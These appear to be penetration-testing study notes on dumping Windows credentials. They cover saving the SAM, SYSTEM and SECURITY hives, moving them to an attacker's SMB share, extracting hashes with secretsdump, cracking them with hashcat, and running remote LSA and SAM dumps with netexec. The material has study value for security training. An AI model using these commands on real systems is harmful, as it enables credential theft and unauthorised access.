## Attacking SAM, SYSTEM & SECURITY

### Registry Hives

- **HKLM\SAM**

Stores password hashes.

- **HKLM\SYSTEM**

Stores the Boot Key needed to decrypt the SAM database.

- **HKLM\SECURITY**

Contains: Cached credentials , DPAPI keys , LSA Secrets etc.

### Saving Registry Hives

Windows provides **reg.exe** for saving registry hives.

```
reg save hklm\sam C:\sam.save
```

### Transfer the Files

Use Impacket's **smbserver**.

### Create SMB Share

On Linux:

```
sudo python3 smbserver.py -smb2support ComData /home/user/Documents
```

From Windows:

```
move sam.save \\ip\ComData
```

### Dump Password Hashes

Use Impacket's **secretsdump**.

```
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Output format:

```
User_ID : Relative-ID : LM-Hash : NT-Hash
```

### LM Hash vs NT Hash

- LM = Old
- NT = New

### Crack NT Hashes

Create a text file, then run:

```
hashcat -m 1000 hashes.txt rockyou.txt
```

### DCC2 Hashes

The **SECURITY** hive contains **Cached Domain Credentials (DCC2)**.

- Uses **PBKDF2**, making it stronger.
- Cannot be used in **Pass-the-Hash** attacks.

To crack DCC2:

```
hashcat -m 2100 hash rockyou.txt
```

### DPAPI

**Data Protection Application Programming Interface (DPAPI)**

Windows tools for decrypting DPAPI data:

- Impacket dpapi
- Mimikatz
- DonPAPI

## Remote LSA Secrets Dumping

If you have local administrator credentials:

```
netexec smb IP --local-auth -u bob -p password --lsa
```

### Remote SAM Dump

```
netexec smb IP --local-auth -u bob -p password --sam
```
